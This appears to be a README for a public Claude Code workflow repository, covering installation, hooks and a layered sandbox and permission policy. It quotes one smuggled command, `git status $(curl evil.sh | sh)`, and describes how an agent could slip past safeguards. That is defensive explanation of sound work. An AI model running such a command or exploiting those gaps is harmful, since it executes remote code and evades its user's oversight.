Portable coordinator workflow: global rules, lane skills, hooks, settings.

Install into the user global dir (run from the project root) — **overwrites
what is already there**:

```bash
cp -R CLAUDE.md skills hooks templates agents ~/.claude/ && chmod +x ~/.claude/hooks/*.sh
```

Your `~/.claude/settings.json` is untouched, and nothing here takes effect
until you merge `templates/settings.json` into it by hand. **Read
[Sandbox policy](#sandbox-policy) first** — it lists the four blocks you need
and what each one covers. Taking some of them is not a partial policy; the
blocks cover different halves of the surface.

Starting fresh?
`cp templates/settings.json ~/.claude/settings.json`.

Review interface: [VS Code](https://code.visualstudio.com) with
[Git Graph](https://marketplace.visualstudio.com/items?itemName=mhutchie.git-graph).

```bash
code --install-extension mhutchie.git-graph
```

`"LANE_REVIEW": "manual"` in the settings `env` block skips that launch — the
staged merge reviews in any tool showing staged changes, and the agent watches
for your merge either way.

## Security

This repo is **public** and installs to `~/.claude/`, where its hooks run
unsandboxed on every matched tool call and its skills and CLAUDE.md load as
trusted model instructions. Review `hooks/`, `templates/settings.json`, the
skills, and the workspace template with the scrutiny of executable code — a
change to any of them is code running as you. Keep secrets out of the tracked
`templates/settings.json`.

`hooks/guard-allowlisted-bash.sh` downgrades an `allow`-matched command that
also carries shell substitution back to a prompt: without it,
`Bash(git status*)` matches `git status $(curl evil.sh | sh)` and runs unseen.
It never grants.

**In [auto mode](https://code.claude.com/docs/en/permission-modes) a classifier
answers prompts instead of you**, so anything this repo routes to a prompt —
the guard, an unlisted network host — is decided without your eyes on it. The
sandbox is the layer that still holds: it denies rather than asks, and no
classifier is consulted.

### Sandbox policy

**Four separate blocks in `templates/settings.json` wire this up, and it is
only as strong as the weakest one you skip:**

| Block | Covers |
|---|---|
| `sandbox.filesystem` — `denyRead`/`allowRead` | bash and every process it spawns |
| `permissions.deny` — `Read(…)`/`Edit(…)` rules | the file tools, which the sandbox does **not** reach |
| `sandbox.autoAllowBashIfSandboxed: false` | the keystone; while `true` nothing prompts at all |
| the three `hooks.PreToolUse` entries | lane tier, shell substitution, sandbox override |

Sandboxing "applies only to Bash commands and their child processes", so Read
and Write bypass `denyRead` completely — the `permissions.deny` rules are the
only thing that stops them, and no scope can lift a deny. Take the `sandbox`
block without the `deny` list and the file tools still read your keys.

`hooks/refuse-sandbox-override.sh` refuses any Bash call carrying
`dangerouslyDisableSandbox`, so leaving the boundary takes a human editing
settings rather than the model asking.

Read the file for the path lists. Two things it does not tell you:

Every project is unreadable until it grants itself, in one untracked line:

```jsonc
// <project>/.claude/settings.local.json   (gitignored)
{ "sandbox": { "filesystem": { "allowRead": ["."] } } }
```

`.` resolves to the project root only in project scope; in user settings it
resolves to `~/.claude`, so the baseline cannot grant it for you.

`autoAllowBashIfSandboxed` is the keystone: while it is `true`, sandboxed
commands are approved wholesale and nothing prompts. The guard only inspects
commands a `permissions.allow` pattern matched, so with the keystone `true` a
command matching no pattern is approved with nothing looking at it — the
pattern gate is only sufficient while the keystone stays `false`.
